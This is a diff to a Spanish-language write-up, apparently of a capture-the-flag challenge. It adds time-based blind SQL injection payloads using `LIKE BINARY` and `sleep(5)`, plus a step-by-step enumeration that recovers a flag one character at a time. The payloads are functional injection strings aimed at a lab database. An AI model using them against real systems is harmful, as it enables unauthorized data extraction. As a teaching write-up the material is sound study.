@@ -36,15 +36,39 @@ SELECT * from flag WHERE (flag LIKE BINARY 'v%');
 Si juntamos todos los ingredientes que acabamos de mencionar y nos aprovechamos de una flag conocida dentro de la base de datos, podemos terminar de probar la payload.
 
 ```sql
-1 or if((flag LIKE BINARY 'vamosNano%'),sleep(5),0);
+1 or if((flag LIKE BINARY 'vamosNano'),sleep(5),0);
 ```
-En este caso, añado el `1` al inicio para que cuadre con la sentencia original (`where id = 1`).
+En este caso, añado el `1` al inicio para que cuadre con la sentencia original (`where id = 1`). Al lanzar la query, el retraso de 5 segundos debería confirmar la presencia de la flag.
+
+Si probamos con el comodín, también funciona:
+```sql
+1 or if((flag LIKE BINARY 'vamos%'),sleep(5),0);
+```
 
 ## Automatización
 El siguiente paso es automatizar el proceso para que la búsqueda ciega vaya probando con todos los caracteres ASCII.
 
+```sql
+1 or if((flag LIKE BINARY 'a%'),sleep(5),0);
+1 or if((flag LIKE BINARY 'b%'),sleep(5),0);
+...
+```
+Si una transacción tarda cinco segundos en completarse, entonces es que la query ha tenido éxito y que existe uno o más datos que comienzan por dicha letra. A partir de ese punto, 
+solo habría que seguir explorando hasta encontrar todos los símbolos:
+```sql
+...
+1 or if((flag LIKE BINARY 'S%'),sleep(5),0);
+...
+1 or if((flag LIKE BINARY 'Sw%'),sleep(5),0);
+...
+1 or if((flag LIKE BINARY 'Sw3%'),sleep(5),0);
+...
+1 or if((flag LIKE BINARY 'Sw3=%'),sleep(5),0);
+# explora hasta que ninguna transacción tarda más de cinco segundos.
+```
+
 El actual estado del script es muy básico, ya que solo comprueba el primer camino que encuentra. Habría que sofisticarlo para que lleve un registro de los flags localizados y 
-siga explorando por distintas ramas.
+siga explorando por distintas ramas (por ejemplo, si dos valores comienzan por el mismo valor).
 
 ## Resultado
 El resultado del script es un éxito, encuentra la flag al completo, y acierta con las mayúsculas en poco tiempo. El mayor de los retrasos es fruto del propio `sleep` de la inyección.
